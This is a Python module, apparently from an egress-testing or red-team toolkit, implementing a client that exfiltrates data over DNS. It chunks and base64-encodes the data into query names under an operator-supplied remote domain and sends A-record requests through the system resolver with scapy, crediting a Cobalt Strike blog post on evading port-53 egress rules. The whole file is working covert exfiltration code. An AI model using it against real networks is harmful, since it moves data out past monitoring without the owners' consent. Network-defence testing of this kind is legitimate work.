"""

This is a DNS client that transmits data within A record requests
Thanks to Raffi for his awesome blog posts on how this can be done
http://blog.cobaltstrike.com/2013/06/20/thatll-never-work-we-dont-allow-port-53-out/

"""

import base64
import dns.resolver
import socket
import sys

from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, UDP
from common import helpers
from scapy.all import *


class Client:

    def __init__(self, cli_object):
        self.protocol = "dns_resolved"
        self.length = 20
        self.remote_server = cli_object.ip

    def transmit(self, data_to_transmit):

        byte_reader = 0
        packet_number = 1

        resolver_object = dns.resolver.get_default_resolver()
        nameserver = resolver_object.nameservers[0]

        while byte_reader < len(data_to_transmit) + self.length:
            encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length]).decode('ascii').replace("=", ".---")

            # calcalate total packets
            if (len(data_to_transmit) % self.length) == 0:
                total_packets = len(data_to_transmit) / self.length
            else:
                total_packets = (len(data_to_transmit) / self.length) + 1

            sys.stdout.write(f'\r[*] Packet {packet_number}/{int(total_packets)}   ')
            sys.stdout.flush()

            # Craft the packet with scapy
            try:
                request_packet = IP(dst=nameserver)/UDP()/DNS(
                    rd=1, qd=[DNSQR(qname=encoded_data + "." + self.remote_server, qtype="A")])
                send(request_packet, verbose=False)
            except socket.gaierror:
                pass
            except KeyboardInterrupt:
                raise

            # Increment counters
            byte_reader += self.length
            packet_number += 1

        print()
        return
